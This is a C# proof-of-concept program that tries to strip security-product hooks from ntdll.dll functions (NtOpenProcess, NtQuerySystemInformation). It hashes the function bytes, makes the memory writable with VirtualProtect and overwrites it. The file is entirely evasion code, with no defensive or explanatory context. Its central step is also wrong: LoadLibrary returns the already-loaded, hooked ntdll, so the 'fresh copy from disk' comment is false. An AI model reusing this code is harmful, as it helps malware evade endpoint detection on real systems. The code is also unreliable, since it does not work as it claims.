using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Cryptography;

class UnhookingPoC
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main()
    {
        Console.WriteLine("=== NTDLL Unhooking PoC ===");

        
        IntPtr hookedNTDLL = GetModuleHandle("ntdll.dll"); // The hooked NTDLL
        if (hookedNTDLL == IntPtr.Zero)
        {
            Console.WriteLine("[!] Failed to get handle to original NTDLL.");
            return;
        }

        // Load a fresh copy of NTDLL from disk
        IntPtr CleanNtdll = LoadLibrary("C:\\Windows\\System32\\ntdll.dll"); // The clean NTDLL
        if (CleanNtdll == IntPtr.Zero)
        {
            Console.WriteLine("[!] Failed to load fresh NTDLL.");
            return;
        }

        string[] functionsToUnhook = { "NtOpenProcess", "NtQuerySystemInformation" };

        foreach (string func in functionsToUnhook)
        {
            IntPtr origFuncAddr = GetProcAddress(hookedNTDLL, func);
            IntPtr cleanFuncAddr = GetProcAddress(CleanNtdll, func);

            if (origFuncAddr == IntPtr.Zero || cleanFuncAddr == IntPtr.Zero)
            {
                Console.WriteLine($"[!] Failed to get function address for {func}");
                continue;
            }

            // We need to compare hashes to determine if the function is hooked
            string beforeHash = ComputeFunctionHash(origFuncAddr, 32);
            string cleanHash = ComputeFunctionHash(cleanFuncAddr, 32);

            Console.WriteLine($"[*] Checking {func}: Before Hash: {beforeHash} | Clean Hash: {cleanHash}");

            if (beforeHash != cleanHash)
            {
                Console.WriteLine($"[!] {func} appears to be hooked! Restoring...");

                uint oldProtect;
                VirtualProtect(origFuncAddr, 32, PAGE_EXECUTE_READWRITE, out oldProtect);
                unsafe
                {
                    byte* src = (byte*)cleanFuncAddr.ToPointer();
                    byte* dst = (byte*)origFuncAddr.ToPointer();
                    for (int i = 0; i < 32; i++)
                    {
                        dst[i] = src[i];  // Copy the clean function bytes over the hooked function
                    }
                }

                VirtualProtect(origFuncAddr, 32, oldProtect, out oldProtect);

                string afterHash = ComputeFunctionHash(origFuncAddr, 32);
                Console.WriteLine($"[*] After Hash: {afterHash}");

                if (afterHash == cleanHash)
                    Console.WriteLine($"[+] {func} successfully restored!");
                else
                    Console.WriteLine($"[!] {func} restoration failed!");
            }
            else
            {
                Console.WriteLine($"[*] {func} is already clean.");
            }
        }

        Console.WriteLine("=== PoC Completed ===");
    }

    static string ComputeFunctionHash(IntPtr functionAddr, int length)
    {
        byte[] funcBytes = new byte[length];
        Marshal.Copy(functionAddr, funcBytes, 0, length);

        using (SHA256 sha256 = SHA256.Create())
        {
            byte[] hash = sha256.ComputeHash(funcBytes);
            return BitConverter.ToString(hash).Replace("-", "").ToLower();
        }
    }
}
